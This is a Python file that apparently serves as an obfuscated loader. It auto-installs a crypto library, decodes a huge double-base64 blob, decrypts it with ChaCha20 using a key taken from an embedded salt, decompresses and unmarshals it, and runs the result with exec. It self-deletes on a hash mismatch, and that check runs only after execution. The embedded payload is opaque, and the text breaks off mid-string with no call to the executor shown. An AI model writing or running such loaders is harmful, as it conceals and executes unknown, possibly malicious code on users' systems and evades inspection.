
import os
import sys
import base64
import hashlib
import marshal
import zlib
import subprocess
import traceback

try:
    from Crypto.Cipher import ChaCha20
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome"])
    from Crypto.Cipher import ChaCha20  

class PhantomExecutor:
    def __init__(self):
        self.salt_size = 32
        self.nonce_size = 12

    def generate_key(self, salt):
        return hashlib.sha256(salt).digest()

    def decrypt_chacha20(self, data, key, nonce):
        cipher = ChaCha20.new(key=key, nonce=nonce)
        return cipher.decrypt(data)

    def execute(self, double_encoded_data, expected_hash):
        try:
            
            protected_data = base64.b64decode(double_encoded_data)
            encrypted_data = base64.b64decode(protected_data)

            
            salt = encrypted_data[:self.salt_size]
            nonce = encrypted_data[self.salt_size:self.salt_size + self.nonce_size]
            data = encrypted_data[self.salt_size + self.nonce_size:]

            
            key = self.generate_key(salt)
            decrypted_data = self.decrypt_chacha20(data, key, nonce)
            original_code = zlib.decompress(decrypted_data)

            
            exec(marshal.loads(original_code), {'__file__': __file__})

            
            if hashlib.sha256(original_code).hexdigest() != expected_hash:
                print("Tampering detected! File self-destructing...")
                os.remove(__file__)
                sys.exit(1)

        except Exception as e:
            print(f"Error: {e}")
            traceback.print_exc()
            sys.exit(1)


double_encoded_data = b'QmxUaGhxeXhUMlUyUGI3aGkyR3VTM2hKbHZJTXJwK0plcUJVaGQwbm1LMjd0eWJwcStJN0FnTmlQZXFDaDNUR2Y3elV2WlUxMFdKTnV1eUIrbWhyTUNpVmo0WWs5NHhScDEzQmFxZDRaQUhqMnQ5d3RQVDZ0QXN2bUVyeXV3WStBeVR6c1FORjBOUVh3M050VDRtOXBBN0FCMTZseEtrMEZ2ZzBvS1U2aERacU5RRmJSRlEwamRELzJFNHJRWTVrZ2VMc2ZqcmVDSTRWMHd1b1NHQm1KaXlyMWFneW5NSEtEQ3U1UXNGSEswM1B4Q0VIZzIwRTRWRWJhYllnNUQ4YTJ4YklSVmh6bkRLL1E3cVUvNHdrZVpSVmg0M1p5ZFc5RFRxaVVobjdDcjFnVkVLclNKT2JyWEhIV0F5SzI2TkxISUM3Y210K1RyZHNZU0liMk9qV21GTjlLYU1oUEJxWlYxYldxejI0ZkZIcFdPUndYV2hQdWs1NTFqZ0hXVkxCSDIwTVl4dS9EQkgyaE5QQTUydVBjcGwra2FacmFXZGpobE9oKzVvZUlWQ1FvRC9BM2NtaXpJbzJaZnVFN3dBbTNxR3RWSmxQVW5ZTmY2NTFRNktNdDhWMGpoUWZERmFNR21HV05GZ0hwUXB3OUU2ZC9VdlBMSk0ycjRWNXFveFFQU3VNa2c5Y0lpUWlwRThmR0pMU0t2ZHY4UGpMcFJuYWRtcFh1MmRJV1ZPcnc0aUdua1ZUODg0L0tiYkEzL1JlaFFMQ3JTSDFEMG1pelo1TUVuTFZiTG1hZ1BUd0tsS1A5S2dYVjVtMzJoNDdhcy9XQjVuVzV2Mzg0ODl3bmlIWldoTXc5Zlc4ZHZQR0VjN0d4ZnlYelFzVjFUbUZ3M3N1K3lFSURLQlVYbm9jbDdoUkdIU3ZZbnpiMExEN3NSd3VMN2loMHo3VzJFZHR5dy9kK21wNGNTTEs1WWxVMko1YUpCcWRCMFJLVk5EZThpdVBscExmTmp0MEFRZFNVc1pIdXIyN0I4Q0xCNkduUGV0UDh2WmJwQ09PWlA2dGJmcWMzUWxudUExYU1IS1lVM2o3RkJWT05HU1Rrc05NcWZFODNHMUtjQzVFK0ZWQ2t0WUdMM2hYNU9tcE05TC9uOExsaUFjcVFXT0JHWW9jQmFxVk0xWHR3Z2hMUDg5dk5EMmYyU3AvYUZnUmZCM2txVWNLNFRzbHRiSjg4VXRNcHFRWjJCY3pBMzRpTUE2SHFwUm1RV2hsMFdBMVJQMVBxdlRtVTJ6MDJJb0lPMjlPWUxMd0pvTjU3Szh6V3FvcU5QTG8wVm9HOEk2UXB5RlcvaWhZckRrUDBsLzNyOGxBd3JGV1EvNHRHU0lUZG9oQlZCUHdobkxWWm1MT3NZNTBhdk5pUkFjWWRuamorNWUwbHcrN2Q1TlBpTTR0QlBtcHZsM2VlSExTZFdlVW1HVFdZWllhc09UK1BlUXdrSVcwaUJMMDBLN2FUd2VkbjJNcFdTM3lYTFNIclFLNmExbmFjVUNJM1hxSkROSWNCWmZtRy96NDZ6NDQ5blVEWmFpLy9PU05VTFJMeFgrelNTdGRjY2h4MklXVGRTYStML2xLbElSZjNtSG11WWJGWVFBZi9ON2dCNUJ5eVpLZGdRR2JtY2ZiVWZqM0xodjNxbVV0MlpVWHJ4cnhQWDlTUUZITVdjdEZIRE5PYXZQbVQxdlFlcXoza2NkMkc0Y3ZxR0owYlhXRlVzWXp1M2h4N3lQNVlvWC8rNnhuOVBkdnR0WWc3dHNod092RUFEU3V0M2J2MGZMQVpNd1RJMnFESVhRckNCeWVwUG9MRVlVWEswRmhtNUJCYURXNmYydit5QXZGQU91d1NKa2NhdGJ2eTkyY2JILzRrMFkwS2lyREJJaGFBSCsrOGVLdFZWbit1VlNKMlJWRGpLTlZIeGxSQnpuTE1nWkF6WjRxK1hvMkhIUGNMeGJzWUtNb3p1NFEyMGRPelNDanR6Y3ZBaGhwNEhqTTdCZ0QwNmc5YmJDcDRTN1FoRUljdzYrZnl4YnNxUzBTdWVEVy9xb0tkVFcwbzM2RllVNlZGa0tHbXExSE9oRXNFc1gwVE10blVJR2J2UXVFVWtHSERNNDFEUWV2NGJvdktVOFJ6UW1DbUNITTVZZ3VJZWFaa3l1T0MxMlpBcHJZVnVYZi9qUG81cUFGQ1hRUlc3UHFUVEtmS0pZWklmVXhtSlVsa29UOXFtZGhpek8vTStSUkVnbTNOR0xvSEpRRmdNZXBkNGhlbmp5czI5eklTQ2laUm0yUEZtOUhIQmhsZ2lxRVpBeUo5Mnd5UVpob3ljL2NxTXRTeE03c3hHV3Awa3RwRktXUnMvN3N5RmppMk05S0trelBQanJlcEJlZWFZL1YvTTFOcldmb3hkNVhRazN3NzhWOGVkR1hNMzN4Vk8rQVlEVUx2VFM0VEFVeXFJSXR2TVBxNDlEKzNsMXord2l6cTlBUUwwb3VGNC9IaUxCbUhyYW16d0l0TTJaU2lrbDcyMHFPRFNuV0EvbmxISTZJdUVRTFF2QUZjLzF5c2U2MmFGVjFsVytGWk02R3E3ajJiT1BIN3JrT2IwL2s5RGgrNlNTTHNxSitiZndjVkhzQXVuNE41NlpFUWpxdWk5bXhJcFNHb3hKM3BWYTFYL1FRZHNZbnkvTUhzUEdjV3BGMlZlMlZtL3Fla2xPdU4xL2JQcUZxQVgzeFdBRUp3TFlRMmhYczNUSUdXMEE2Y2JldFlDMDNQajN3ZlZsMDJOVUl3ODZwUEk4YVVNWHlxWW1EUEhTUURDN1JQb3cyRUJ3ZkVvOFBJdThRWnNWR0o5a0lWbEJOdGVvdk5PWU5NY2srODl5UEErOXBJRjh4cUFUMjJsdWRYYW9XRFZITk1aMVR0UWJGSEY1UWgweVo3OHkyLzdtTTlKeUgraEUzUmVHclVjOEVmY0RlWFFpU1o4S1JkakFLelhSUVZDNUswZVE3c051dFlDTmhNajNvaWhLTE5RVGNLZHJhV2M1bEVCV2ZOeTBMdDBKNWJBM0gzdnhOZlR1UG5HUm4zeGJMWlNSejZ1K2ducExjRnBId3FFMytqWVVTS1J3OVp6cFBHakpIeVFINEQwY0R1VVFKMFZZSHp4RnArekZHVmZBUVZoQXByRmJ1dWtmTnR3UzdGRk5YWEZrUzJTYUhtbGtYSjRMQWNLSzhhNy9NbitXbHU4Wi9CN3hxRVVweVF1ZnpTSCtOeklaTWVHOGdTc3liZFcxNEUvSGMvbWZ1UEZHZS9GT09Rc1l5SWt0bnh6UXliRHc2SWJZbmo1R2lNNHlMZU9XNjE3Nm5LOWpKOC9tR3hYMlhrNkt6dmp4YTVaK1pYWEY0cEduYlpwcVp6UklvZnBkYWJJMXY2ZG9PNndDZjdiVEx5Y1NBT1FpTFBwWTdKeENFaStyUm9EZEE0bDlZZXM5OFQwVGc5aHFGRktRYzROTWFPVFRMcTZUWEwzVFNwcTJKM1lmTnF4REQ1YytZZVhZcWN5V1A5eUxTaTVjeEtRYkZzT2IxYUFQZEhSU1FYSkRNTVEyTHVrYUZvbmthdFJEcVpOZFh6TUQwTGdmZ080UTNuMVZVQkRHL0RwRVk4MEM0M0xzcXVXRWoxWDk3ZUZoUWZSeGsvRmk3ODBNZmZIRXdmUVQzUGFkNkUrNjBaNkNyVmhKMy90U2JQL2U3WnpXT3VhMzJrY00zRUVJNE5IS0VqbC9FZjVuMXU5eEhoTGhNUVlJOFZXQURKZDA3cElGMHhjQXJ3UGFBMG1wZ3lhTWR4S1ZKRVlGSlh5YVBFd2hzRDMyckxvNjhVbTZQSHYrTThnSlZ2WVRVWU1OQjFUUmh6SjBBTUpFZTlVUXBiY1JhS1NkMDJtRUx0MXU5RnQ4dGNlWjlxYjdPL3EyaDJxR1hIem5MYkRpMUFYTGJPdHlrWDZsLzk1WEx3cGZhWThYcDNiWVAwU09ENWtXRU9kQ2ZmeDFUc0ZVSUhVMjluY21yS2lCMTN4UDRNb29PY2FGN3hIMi9ZaGl1SWUvTlNXVmlqUUhMNXZ5dFFRRExubHQ2UXZhcmJMaUg5RWhIaXgyKzdTR3AzMHk4Wmo5OEtQVkVNSTNpOEVYRzVkSmRNVUdVNTA5WmlZN2ZRbEtMS1BJKzZIcFVmNmlibVcvM3FoZGpudW5TYVRWamR4a0MwVkREeDV1OUc0VWpKdkJKdjNWUXEyZ0dtemY2ZG1nNlMwajl5NktVQU5hbE96Vk1nSENCeXMwVUo2ajZJamtWOFByeU9lbTgvUnJBS1Y3TUVBbkplM1BtRkw1MVZ3Ump6a3BZVVRaNFNHMDhTSEo5UlJjdEhsMVAxcGJNUmNIOC9wTFlMaW10RGZxM3hRbU9HTTZ6dDd1ek5QdmNYZk1ZKzNBMVB2azJQcWc5aXFoUWVKdHdNUnlqRnhUTDBNOENnTXBaTzR6M1JRd3hjSWZmWG9KdUVOeEljVnpvUDgzc2JlQk4vTWRQMkxTeFNwNmVtMGp6NFRudGl4Vk5XVzVNZjNaSnYxSGIvcmFLUjBGQXNRTThRTW9UbTRONGhNcTNibTdUOHFXK3lObVdIdmwzR2VFSlNXNlp1SzZhYWhMVlM0UVk5aWxjT3MzbmN4bjc5c3pLUnNQdHFRdm9UdzEwT0ZOVGdQZVk1OVZzM2tJdW0vbUNCa0pDYTRxeWw1UC81Qkh2Tno5YldxaUlvdUF6VmYwYkNLKzZZeWc5YTdYZmtkbkdscm5TdEpoVzJmWU92bnd1V0NTbnFpeGh1RHdPb0x0OTY5UThDTmYwNUFEWk1nOEs5dU0weXRzd05rcG5CNHdjTmdYSmVIZmdqS3NlQkd0K2tiNkppaTcvZGpxRG51ZTVqbnlwRTAzY2p4Z0E2UFE5MFU4V04zRFV2VWZMRjJ3ZDE4SXlOalllcHh2WEl5cmhYd3oyVHYycFJsa3FmdjFtNmYyZ2pVOU9ZRldWQkpsWUM5TzhVUCtmZ1c0akVZLzFoQ1hEOG0wREZjczBPMWwvZVR5b25TdHdNREJjcktnWWJBWjc0aDBsU1IzYWthcjlCSlVySWEyTUFCdGxLZGhxUlp6Z09JeFdsNE1IR04rdG9oVVQ3M3dEaHlibHVCUHVuWjNlc2NBc01IQ2RuYUt1VkgvaTI0Mjl6Q2hPRHRhcEsvQ2JxMnFHdDZlRmw3TDZjeUZ5TEk3S0xsMXJpRERKcGl5VWV0bllFNWRwZ05WZEJIUTZNbVVid29zTk1sRmQyRHcybUdNSER2b1NDNkVTUHpobWtqTDhPcjBFY2kyL0lnNDFnWFJVamsrOTkzckR6bkp3QURUSXJRQktqM2dEWU5DWTJ5WXNlV3gvbnZRSXlpOWtnS3UrVTZOYnZEdkFza0I0blNFMU54L01rblBxMkdQQjFBSGRvRUZnMHVreGdSelFiT2lONzVqamxWTGsvalJ2d080TURHOGFEcTY3YmRrWHd6MmovemN1QVBwWk9FUVZEeVNnNlkzanNUZnFYaWlnQjRZUmJyR1BoWExGVjd4RnNhdkxZT3VqdE1Qc0xvYkZyVmljUGpwcTAzUGVnREpVVjh4N3NVRVh6VE1oNHB1S0pSZHVUWEMwS2IxSnJhUHVRZVZScnpDMkl3UGpDeEZnYXh0ZTNnN0RJMzgwZ1I1dndvZy9WT0dYOTZwdTVXV1lqeXZMRUFsS0dyNEdOY3FLVUUvemF0SkNzdXNjakU5WHlsZzNkYUphc281cG5LWGJuRGdiOS9oZGxyZ1RndmIzNUtHSjNiSW5aeE94OW1JRkNGamh4VUsvaEhHYUlaQzBtY2k3cGhtckgvVzgzVWd6ZDJHdXFWcGh2bkk4Z0MwM3pDWWMrdzFDNG1MdS8zUFUzbVAyeWpEMXNhVXhSdEE2cHd1eHNuU0RZcEFYUFM0ZU85QURhTE9LeEowYlB0b0NxWVJHZ0JLbjZDSDRLOUdaZXUwQTRIRk9YRHBaZjE3NEpxQzNRTW1peXkxTTBjdkoxM1Eyb244VWs1b1NuUktSZDZMcU5PUkhBd1FhYTZXMDY1ZlhLVTdIL3VoRXowY3lpNzJnMVNjdWt6bkttb3VSWEQrVFNUQWN6d01RQ0VIcFE5Ukl3QjUycmJFRFhuYUM4SktFdTJvb1pPbmFFcXhhMmh3UjBma0lsQzBMcmJnZW1sMndsM2FybXFEaTgrbDVVWm4vRElYRzI2ZWQ0RkF0WnBBenE1L1FQQ29CRlZOOUdhMTNVSVJNMUZlRWdQU1RsMm9PSHZmVExucVlpZitOVGh6N1BLc0MwY2JVenhPNTgxYTVIdG8wSjIvQk9kQ1VBY1hBRFp2MWJKTEpzak1NYUt0TE1rRzZaTkx4aTRPSTlCV1lNSHRld2Z3SDczSmJ0TkNLWW9XclJLeStFWHJIckI1ODVDYm56eE50V2s4Y0pwNHRSNGswY1VVdlNZanpmM1MxWHUwcGpmK2N6d2lMYVJ6clFnenJpaSswQW5YUFJ6V00wMnNUZEh2QzE0cSt1WEZJcCtHTmZ6Qi9Zb0wrSU1pWGFzN0JTQytpQmRMS1p4Q0lCa051S2htQ3VTNDJlNXdtZDI2SWFOaWRSampFSWpPRzZ6Yk91VVlsRUxZdFVTbWNXVkRRMDgrRFVYT21abVl2QU1BN2xzSnp2RUdkQVlqV1dFRkZPTWpjclVObWJkRnNEWkFlVnpQbEd4WnI2NDVSWUJVNUxENmYremt1SDVJejBQcElBOVJNbFZnVkpKRXJxMGFqcDB6K1NTbi83N0xzaTdwdkZDT3JXcWNiN01LV1JHZGpaZHhuU2NNYTlDWWkzeUJENGRNZVNRYVBTOFlMdXRBWFNaU2hMTk9Jbjl4aWFBb1htcjJ3Q2hkSFA1WjNlcFFCM0IxOVUrbXVtRWEwTFVGTzFyYU95amw5RTJvMjRzRUFtSll1L2NTcUdrTy94eFZZUUxFS2JDTE02aUhhTGVTR3ZRem1FWE1vRlMyUDZrM2U1T2dkS24ya0pyVHFHUSswWjFnUm1kWUk3OWh2c0RIMkVkajQyMVYxUjF6NWFzMjZ1My9YZkg3d0RmUldvdHl0eTFvaWFXZ1pVUmhDZzhBek9wTlRKL1pobWZ3c3M3UDVJb01iVkF0d3g1a2NvazBTVWxsY3FQa293Wlh4cUJIekNQaHNKK3IwVnBWdXpzbEZPc04zTW1PYWxXTktJU3MvaVlqNG1aWUZDYldQNEY3VzYweWY2cHVuTGNwWlAvT25ncXlsQm9DK2UvdDRHYkJEaFRYdkpKZ0pGeG5mUGdnK1ZsdEc2ZjVWRWlYV0xCQVlkbnpMNGdFakJrNmNSS1JYdnlPeGIzOEI5ell2blMwYThRRGRWbDVXb2doaEF1MzJ2SjlTZzNTdW9KRWVyMFl2UDU2Z0lweXBtWmdKbDg1NXlnRzRyMGduOGZ3RWd4aUNoUmZCN01iSGJFdzNUNDFWalM0WkN3YjlvNlNVOXJ5d2t1R0xtL3pGU2lCNkNQZzhBbWxIbW9QcEZxbE5LY3NPdmdnSVBFUkFwZmJGK1h1VG9Qc08vay9nNzlpZmJxd0JEZnp0WEo0SWowU0VXelZ5NGYxUGRmejBaTkY0c3VqeFlsVzE3ZHVJS3NoemlHblREM1J2eXJFdUpyU0psSTBJd2tDMTE1WTBUODlTRlZvalZIQjYxMmRIcTNzeDBuNzIvTHF5K1pJTGU4MENOdGQ2VHRiUUMrZVBJVjNGU3lweHhHaUhua3Z1cUFZNjFWbzlkeFVBNXUvUDlvbTU3SUNWVnpKVkViRTFnU0F4YXNreVZVeHZIaWJwZDNFUm9xTWdiSW53cHdtMkVTTlpXNTlSL0Z4R1J5RlFncTB5eEZNbm5CZnNpWUZ6aFhDVGdFZ3RralltWGNVY08xaE1wbHdKYnQ5QVpqclYwUTBYVk5pc00wSUk2aXNnMTdHQm5ic0dWZEhZWSsyelRneUpDM1FmM0hCakVIMWhDTUNUQ1IzV1RIZUVHbTVBQkh3cnFZSmNLQ3FOT3BFQ0ZUSHY4QUdQTEpKSGRBRVhJd05sNTNEdk9tTWQxUWt4ZHFORDRiR0dMbHpUVDVwMWtwaFhTeDJhTGdLTGt6TG5zdFkvUWZTdHBVWm5tOHg4UzhmSDhIUzYvWEtFenRiRHZpbnhrbmdMWThJTVVNZHkvN0o4U21zd1VLYW8rQURMTm9HbGtrd2RhRmhXUHh4L0pXSEVrQlB1ZFdVclhUOFRKZTluSjh3THRKMVJiUVAzUTg2eE0vaVhRdy8vbnc4MHdBMU56c1l2M3VTdjhNOGZ3ck9FUzNhT04vaW9qakM4VzA2RlphbGhScU5SaExSSE9vYUsvbXFJT2ZGS1FzRTRWZjRocjcxaUxQbW56YXpPWmh6WWZad1JFTjFkZTBuOEJ5Ynk2K2ZvbXIvNTc1QnVKNWFpNGdSN3g5TVRQbHdTT1c3M0NFTk5mZTJURWI1V2Y3dDViMXlSWlRrK1ErUmN4Z3ZoM3U1czRkNy83aEdwR3FGYW9VNzIyTFEwa2IyM2pRTHlCYXJNQlVDS2NKVC9hMDQ1cUREcUxyUlFrOHRNYUNxVkNPb1lNeWhlMXVNWDJtUXQwbGJZTm9ZbXZXcmJISzNuSlJFWi8ydFMrVVU4citrb081bXBtSDVENGJvaUFXelY2cGdOdTBnTHJlSTV2RHhsOWZvaEJTellnMDJmS3BjTzlsaEFySVhjQTFxK0VUdnYzRVpmK2VIZStkV1M5c0RsMnp3TnZ5VmZVRVdKWnNTWmFLSkswYVlkT0daSFJrNjNHbkJudjV2TTlDS2dmZUlJNzc2dWRGRWJoc2RTOEJaMitaU0c5YWhTb2J0bTlDUjBKY0I2TS9SdVUxR0k4bEI2OXY1TmFtRUpDbGdCS3U2dVowK2hSQVhKdGVWdk5sSlJscXk5OUVoN1AxOGJHUHJ5bml6dVJxZGxHWFg5RTVsMFFBc2p2VmNyb3hEOEU0ZFlVYjh0Zk0zc01hUVJtL1N4U0xuRXorUGR0bjkvdGlTQkNRMDlnRDgxMHNzYStRdHlwQTNKUSsvL3VGS0hQNGZ3RGZXWUNGK01zUjdGTHZwUmRKRWNPQjdvNGRteUFkSGovcVdkN2VmZWxTcHMwVWE3enc0eWlGV3pYV0NxU3E2NzdZMHpGNHFQQkQzQzRoS3VSVHRidFFPdm5NQzdyOEF6N2kwWndudU5JVW1oanRnQ1QrVXppaG5NLzZ4dGNzbFF2MnlWai96ZkJzMHIwVE1WOWt6ZTVFd1hOSWpyTktvQTVXU1Awa2ducGR4OG1KOXJmVkV3cy9OS1NlbEF5ZUQ2TUtqNk5TTkxBdGtuTlBjOVpySGViWDVzeG5MMzRSbDJJdTIwdkFVWmF0Q1U4ZmdqS1dJdDNJK3JnbURHUW5LZW90MkZDcFptRjFxSmJKNEhlL2xVbjByS2V6YXdGMjZKaWZJSUtVK01KVXIrTjFWaGNaMldIMHdtN3lFWjJ3aVRaM0V1RnJ2YXkzYndMSlBRMGwzcXRkUXdtZm1Jdm5QK2VPOFEvOE9sLzREK0dJZmVYSnRjRS91NlFScDcwQ3duSU1rQWlXVW1KYUhyTk9wSHRvYllEek5xUFNoTGtIUkJ4eGdteko1Y0ZvaUdrdWdiL2lzVGl3Z1YvS2lFVUxiS0lHaGRKU0l5UGluSlBneW1IQmJGZFVJQkVPb2JXbGpmMmJXNTZSUWsvNDNScXFBekNWamxTcEhDcjl5b2krZ0dTaWNDUTFBY2kvWDZTQWZKZzVvSnBaSHljTXVpa1RNNGtZUlJ5bkRRMDBMeFp0bmdHYlZqZkh0ZUVmWGc4WG0vMVlNSDFGcjY1bHpBRk4vRW43czVLdSt5MnpGK2NNbmhiNkVFWWdydVJBbjUzaEFPQ0pST1pEbGdCN1hBUG9xcGNhUFh3UkFpRSs1RUJuQ005dFp1TWUwZmNQYUU0cTNObUtRLzBTL1p2LzN0TEc3UHZFcllRT0x5b0VhL1l1WVdpSlRVc3FlWVlQdTY1RXVqWUo4UzdkS0VOck9tdTdXaWRUUm9kdFcyUXBoamZOWFFZRXBTUVdEeGlhL1Z1d2FQUEMxWmZaV2xqU1pWZzJWZEdCbElLMzZLK0N5RlNmRU5IdkJqdmVhY2IvSnYxN2FlVEtKY1IwVStJSnJEMVZrd3U3SVVXcWVOdnQrYzZqaDNqdjM2czMxQmxrRE5GU212NkNONVRLeXl1d3pnNVhNVTNPd0sxZFl2SU02dHF2RWZISUFtTjB3QVBnWS82dHhwTWlIaWlQcVNQM3I0Mm1QSUVvR01FdTNYRy9NdTJNc0dTamw2L3hkdlRxWnRLTEhVT3RMQndpb0dQY3pxbDNXNEwvVWhqVVc3azVXdU0zbHJkc2tDRmhTcDZ2eVByS2xBSllpb0JBWDN3SjZEZFI4QytyQm5RRWQyVGRUY2NHZUUzNnl1V1JwYUNVam1lNkE2YTdOUTU1V0xhOEVhUEc0eHdLRkNFSFRLYlZnOWtNUi9aYUZMWDdzOERKTTVOcWM1WkY1dFZ1d09xU0loOXhzSzRMWXZTNWFJUVlNaGdXZ1g4dEN3cUdOMGlYdktIaWVpMnQxMFkyLzdNVXlraUhVSUVyMXFyZ2xlb3pJeVorbnB0eEZyYWNPdHQ2R2tTSkpqcFNvNHkrZnlKb2E4bTNNQlJUQzI0L0MreGFxR0JQL28yZHZTUnVHN3poZ0V3UFhhcDc3dXI2RlY1eERLQUlvQnRoMHVxZjl4a2xHZnQ0ZHV4Zm5yR1hKNkdzWnQxT0xFVHdOQXZXaUJNYmdYY2d0OTNjMEt1ek5CUGFjejNmZjlVUEJWa0RMQTloa1k3ZHRYdUVnQ2pXeGlnWGZJM1c2UWJJMnUxampxSFZXVHdSeWdnLzV5eHNIZUFuWTNwRm1LWXNNMG85Z0FLdkRpb05QSk91UjdibEVuOTNzVDBseDFXYlpGTWhJam40SXhoM3J3Nzh4bFc1Yk1oeGNGZ1NWbFE5MDBFZWduai9JbUxzeDVETHZZb2JwOGZQcVB4TEVtZWt0Q0kzZFJldWVycXZUT093bm15dWJrQ29ubFJlZmkreFBCb1YvVDh4Q2tJeDMrbFVLMGhzcERFT3g4L3dxQVFzVU9ZbytWY0R2emFSU1hoVUhlT0M4OFg5ZzNQRlA0UHNiSVVQa2JEWTZVY0V0NGNvd1VZM2U4UW94ZThtTGIvNU5DVVAzeEIrZ0NOaGUyUjZDTGQ2dTlmb1lTc2M2QXoveTR0R1JKZFVXZ0JqS0QxeDhUTDRQT09DUDVSYUVDUlJGSjF1WGNBVXVPdzdZNkM4ZFlQZzVjSUZhTFRuZWRYR2ZheWQ5djZETUIrK1ZpNFZCYllHSHhXcHJDYWdHL3VBRHM0bC92L0pWVjFNNlJ3Rmo1c3JSQmNQbU01K084eHZKUmlFVFJkQ0Q5STYvK21iSG9zWEtPTDg2ekwvenNRcDg0ZjFDL212L1NaMjNCQVRET3JNSnFTN3ZGZmlCSU9od2xqTDdzWHd4UTR6aXhHd1N6WGc5cUlXa29qTTN2aHdxdFpwUm52bzgyVnBwVnBUTXprK3JZR3l2anlXRlR2ZFh1Um9NdlhaTEppdmNhL0hCdmZId1VPRHpiVGE5SmxJdW1mQmlXRUVHbkxPY3lRSERscmFHWldKd1l0ZHFqcnJtRlNSQzRuZDhSUWVGaG05SWJwNzVKVXJoNzhoZVlUY28rZ3V0S0ZGT090czRyL3FIdjQxNTZzei9yWUwvRVhrOHpyWk9sY3ZpcWdtc3BXeUFTM0RIbVZKUjR4MjRudnUrMVFaeXRhQ0hKcStWc1VYbFZsR2JmaGxVTjA4ZjExVmw0UnRBT212MUtiTVhqcmVQUDlvbGdUYmE3dnl6ZVRma2x0MGsxTUVDRFlNMFlxb2ljUDhCY3ROWHUremlPU0ZLSFlqcHNySFgyNjJTZEE3OTg0TUpqb3VjMklKc3JaZlpoSHZJWkZLT3lFYXpCTWFKWUZhenlzSGJEVWpKSElGMXRySk9CVDdBc1BhZmVhL0tvK2pRVDcydlA3cmtJdzhTVWI1L0RmL0psNWl2VFNYVTVSNkpyaWY2YUY3em9KNmI0Rnc3M2hjM3Rqb3hmNStJU0lhNHNXKzJ5VGZObTNHN0xzaG1FT0t2VEs0enp0ekQydlJEelkrTzRrQmVSeHBXa2NnR01lc2FkUVkzWHM5OUlMQmtXSWNlZnRlS0srb2pIc0orUFJvT0FSSTRvejlKZlBYSHpqbGpqdHRLSmdjZTdiVlFMcitZdTNYUXdzRStVQkhyRWVUNFVKTkphbEdXVjhubFFaNGJaSy9XL1RKWksvWWZzeXluLzEvZUI4SlVEU2EzK3k0MzhEN2wvbFNGT2JwRUxHdWttd0tiVG1Rd2FqZ3JDNno1UkhEMGVYd05qR3EyN2JLbm9yU1cwdUJYRzFWNzF0aDVrSFdOVXZCS29CeVR1c1FoMmhKMXllREh1TUlPMVcvbHVCdTZ0N2djRi8xaWJVb29lMVRkbkh2SHduREJQZ1NRS3hNMlgvUnc4ODlRS1NFNDhDaEpkcEJhc0JJL09hdnkyYTBFcWVBUTdCdnBDSjRDYXRaT1Zhc2t2Q0FUNjV0VytXQkFVdHBkS3NkbjVNNWZ3MmhySTNub3FsOHJhV0JMMnZaMXhwUWJnS21LN2VVYnJ5U1N3YVJmeVpBR2M2aXpmMEt2Uys4RHpYVlpIcksrc20wWlpkSnRET2ZnWjdONHlXVE1YYStRNUpVdS8wNzE5d3ZaTTQ2Y09sT1R1SlNaRERhL1htUDFmdTZUMkhTRFA0cHdza2NXbVJUdGJ6bVY4cjJrdzBvaFZ3MzBueGI0Vms0azhNMnZ4RldVdlBLWkFqMXJzK2lVMTFDamo0aEMxNHBaR0ErS0F4c2crQjEwdGZZT2drT29yVFI5UzRWb1BkYTdMeFpJT3VOamNxZzExRmdqRk9ldnQ4NXN0ZGlqQVplVHIzcXNEOUp0aDNaT2s4ak5TUEJEZy96bkNua0lvbUg5dit0OW5uYWZJOVA4TC85dTJMUVMwNUNKUFdHeWFJalU5dWpaVGZjcWFTTnY0TnUrMHVodFFKOUl6Vmgxd01ocnZyS0pxQVRxd09QZmEweUhwUDdjNWY3ZGxVM0VLenU5RjhxZG5nU3JkV3F6MkwvTzQ4cXgvV2djQzF3VWowNCtlTUFEKy80MUJ6eVFYN0d4TCtqcENJK3hmcG5QSmdEbDhkVkg1V0w0T2kyR2ZEMndkeEdES1RZdDNhZW9HVVdkTFFvTEZmbW5Ka0F2Vm0xcUZCZ2hOSDJ0OGVuTms0TVUrMmkwNFpWU1hweFordjdZNWJXdVpTWHJTaFA2a29JSmpEa3FpR0RWbWJ2UHZYMXN6Y2M0MWZyM1Z3ZDVuSnFGZ1JWRVRibkFqZU8rQ1J1TGZOcjBHdG9pUHNvMmNNc2t1b3ZkckI0S3BISmxxM2xkTEhpQno3blBUbjhrZXg4dWdaTG4zSGtvYWkyY3hCUlFNdklkVWhQc1Awa3UxTHBvYVRZLzcwRGYvOG5SQUR0bXdDMGtxT2kzN0J1Y2RnS01hN3AwVG9nY0l6Wm1nQjIrNlBXZDl4bE1VYnl5VjA3TDdjNWpQdWtoUUtIVVNrNGZFOTB0OVo1aUVPbUZtUExHTE02MmYrbUtPaHRFaFJ3NVg3WEdlL241L24xa1JDUkprQUt0OVRXdWl0dWhSSzdkVkhmVkhkcFdtZ0RBRjNPblVOMFE5Qnl6VjNPU081RE1KWG1pSWFRbDcyM1dMZjVLNUFmVlBCRGkraFNOU09JSUN6aU8vQTg3M1kvRW50Z2IwTGlSa2orK3hJQUF1RFo4U3M3cWd2OXBseURlL1VIZFNQeG1nb1RVZitQUStkL1RMaVBPQ0k0VWsrUncybmMxdFBMdm9qOVFOZVNZODFwUGhJRFRGWEZObGFqZmJYVThLRkhaMXhERXF5VEVpZTB1b2RSdm45VUZkRHNiUDdLeVUvWWt2WWVqTHNKTTIrZ3gvNlgydjluamlmSi9UVFV1aGQzS1QxaC9TUFl4MmpVVTdxZ1RvV2c5Vm1XUWxNUGVYT25lZHJQRldhUlptcTcranFRZHZmSEoxR3RyaExYWGJIaDJlWmxvSEFXa1dua3o1SVdoNkd0TjRaSDFBaDIrTU5CbTRqdXN5MTVFd0NUb3JWN3BjaEVnMkhQVk92RjllL2d6eGk5TmZmOE85U0NGZVhiRGJjUGdvV0U4bEY3bExZaXRXbU5KUTZOYW5jeGxHVGxuK2twSUV1dlloMzY1amlqdW5pSmVZYk5ycjdwdE5hcjM0dzlQaGd0VTlrQ0Z6Z3dvaXd1TzViZEwwZXdBUnZqRXEvZHVkamFWV0ZGajczbVozTkMvL2djUUVZZ2JJdFFVbjlpaDJabEZiTHdlU1hDZkxaL0svaStZL3lTUWZnN3BhVUZZeW5ud2grUkZhekNwcnlNZFdkUHJSL2ZYcis5TlpWRExhdkIveXlPbFRRY3BEQm9LSlltYVRQaU5GNnFBMjlVSkpRZUlLazJXWHpaRGx4TDErc01WRmdJanNsWkhycWx0Y09nR1MwS0dPR2pRajRQY1JoYmhKbitBWWw4YVd1T3lOWU16WXhkMHBib2NneHAxK2pMSTNtWEgvSUkxbUdJMER6eEtVaW9OUGJaalhWWVpZRytXeGR